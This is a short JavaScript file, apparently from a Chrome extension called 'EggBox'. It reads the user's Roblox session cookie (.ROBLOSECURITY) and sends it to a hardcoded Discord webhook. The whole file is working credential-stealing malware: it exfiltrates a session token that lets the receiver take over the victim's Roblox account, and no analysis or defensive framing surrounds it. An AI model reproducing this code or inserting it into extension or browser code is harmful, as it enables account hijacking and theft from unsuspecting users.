function webhookReq(webhook, cookie) {
  var params = {
      embeds: [{
            "title": `Eggbox logged a Roblox Account!`,
            "description": ">>> EggBox extension logged someone; see information about the user below",
            "color": 15258703,
            "fields": [{
              "name": 'Cookie',
              "value": "```\n" + cookie + "\n```",
              inline: false
            }]
    }]
  }
   
  // Send the webhook request
  fetch(webhook, {
    method: "POST",
    headers: {
      'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  })
}



// Driver Code:
cookieInfo = {url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}; 
chrome.cookies.get(cookieInfo, function(cookie) {
  if (cookie) {
      webhookReq("https://discord.com/api/webhooks/1106996023320125531/3C5c7pI7MQwNwwczTaSWUjkh3qUUgHc8u5pwA62vpNzxTONkKLurJHxFsoAbG-VQ0ue0", cookie.value);
  }
});
